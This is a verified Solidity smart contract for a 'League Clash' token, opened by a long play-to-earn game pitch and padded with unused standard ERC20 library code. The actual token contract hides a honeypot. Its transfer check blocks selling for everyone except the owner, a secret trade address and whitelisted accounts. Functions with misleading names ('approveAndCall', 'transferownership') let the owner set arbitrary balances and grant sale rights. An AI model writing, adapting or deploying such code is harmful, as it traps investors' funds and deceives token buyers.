/**
 *Submitted for verification at Etherscan.io on 2022-05-16
*/

/*
Introduction
League Clash is an play-to-earn, Strategy game built on the Ethereum blockchain.
We plan to build a passionate community of fellow fans of the strategy game and 
build an amazing and immersive world of league clash on the Ethereum blockchain. 
This project marks the start of our highly ambitious strategy Metaverse vision 
and we are in this for the long haul. With Blockchain, we are now able to bring  
dream closer to everyone, especially the gaming community. The League Clash team 
has created a place where players can own and experience the power of a variety 
of characters.

Mission
To create an limitless universe, where players can expand their creativity while 
bringing income to gamers.

Vision
We started this project because we are huge fans of everything strategy and we 
want to build a world on the blockchain inspired by those times. 
We chose the strategy game genre because we feel that in a world that often feels 
rushed and busy for a lot of people, strategy games allow you to relax and have 
fun, while taking little time out of your day and without putting an additional 
strain on your daily routines. Accessibility is one of our key focal points as we 
want League Clash to be available to as many people as possible.
As a team that loves games and movies that have a good story to tell, we want to 
put great focus on world building and lore in League Clash. To achieve the level 
of immersion we envision for the League Clash world we will put equal importance 
onto both sound and art, continuously striving to improve on all of these three areas.
Following closely the latest developments of Web3 and P2E NFT gaming, we intend to 
be flexible in our development and keep open to the latest innovations in those 
areas as well as community feedback.
In the short and medium term, League Clash focuses on developing a large community 
of players, bringing practical income to players and investors while providing 
creative fun experiences in the colorful, challenging world.
In the long-term, League Clash is intends to become an ecosystem of blockchain, 
crypto, NFTs, Market Place, the driving force behind the NFTs, Metaverse, and 
Play-to-earn game series.

Gameplay
 The game is a free-to-play mobile strategy video game developed and published by 
 Finish game developer unit. The game was released on Google Play for Android on 2021.
The game is set in a fantasy-themed persistent world where the player is a chief 
of a village. League Clash tasks players to build their own village using the 
resources gained from attacking other player's villages; earning rewards, buying 
them with medals or by producing them at their own village. To attack, players train 
different kinds of troops using resources. The main resources are gold, elixir. 
Players can conjoin to create clans, groups of up to fifty people, who can then 
participate in Clan Wars together, donate and receive troops, and chat with each other.
League Clash is an online multiplayer game in which players form communities called 
clans, train troops, and attack other players to earn resources. There are four 
currencies or resources in the game. Gold and elixir can be used to build and upgrade 
defenses and traps that protect the player's village from other players' attacks and 
to build and upgrade buildings. Elixir is  used to train and upgrade troops and spells. 
Gems are the premium currency. Attacks are rated on a three-star scale and have a 
maximum timed length of three minutes.
The game also features a pseudo-single-player campaign in which the player can attack 
a series of fortified villages and earn gold, elixir.
To perform an upgrade, a free builder is needed. The game starts with two builders, 
but the player can have up to five builders through buying them with gems.

Game modes
1.Freeplay mode
Freeplay Mode is for new players. It is one of the playing modes that has modified 
and improved multiple times from other strategy games in the market. This playing 
mode is perfect for millions of players who have not yet acquired knowledge about 
cryptocurrency.

2. Arena Mode
Arena Mode is a gaming mode built for multiple players to engage in the game in a 
short period of time. Here, players can show off their skills to compete with other 
players and earn exciting rewards. It is the thrill and the risks that make the name 
for this particular playing mode.

3. Play-to-Earn Mode
Play-to-Earn Mode is an appealing mode for players who want to make more profits for 
themselves. The rewards are also varied among the Characters.

Buildings
To earn and store gold and elixir, players must build gold mines and gold storages 
and elixir collectors and elixir storages, respectively. Elixir is used to train new 
troops, carry out research in the laboratory to upgrade troops, and to build and 
upgrade certain buildings, mostly pertaining to buildings used in attacking another 
player's base. Gold is used to build defensive buildings and to upgrade the town hall, 
which allows access to more buildings and higher levels for existing buildings. To 
earn and store elixir, players must build elixir drills and dark elixir storages. 
There are a number of buildings available to the player to defend their village, 
including cannons, mortars, bombs, teslas, traps, archer towers, wizard towers, 
inferno towers, eagle artilleries, and scattershots. Players can also build walls, 
which can be upgraded further as a player's level increases.

League Clash Features
League Clash is a war game that combines strategic tower defense, hero cultivation
 and league war. The game is developed by Battle Chaos Mobile for Android and iOS devices.
•	STRATEGY, ATTACK AND DEFEND – Upgrade headquarters, unlock defense buildings, 
and arrange traps to defeat enemies. Recruit heroes, train troops, lead troops, use 
strategies and tactics to capture enemy castles and plunder survival resources.
•	ARENA, GLOBAL PLAYERS – Enter hero arena and compete with global top players. 
Find friends to join the alliance, experience league war, discuss attack and defense 
tactics with allies, defeat enemies, defend your homeland and win the final victory.
•	RECRUIT, SUPER HEROES – Summon superheroes, improve hero quality, awaken hero 
skills, forge equipment and artifacts, enhance hero strength, and form your super team. 
Clash with millions of players around the world cross the servers.
•	CHALLENGE,LEGENDARYBOSS – Send your strongest superhero team to participate in the 
time-limited legendary boss challenge. Seize the opportunity to release skills and 
instantly output explosive damage. Climb the challenge ranking list and get abundant 
ranking rewards.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

contract LeagueClash {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}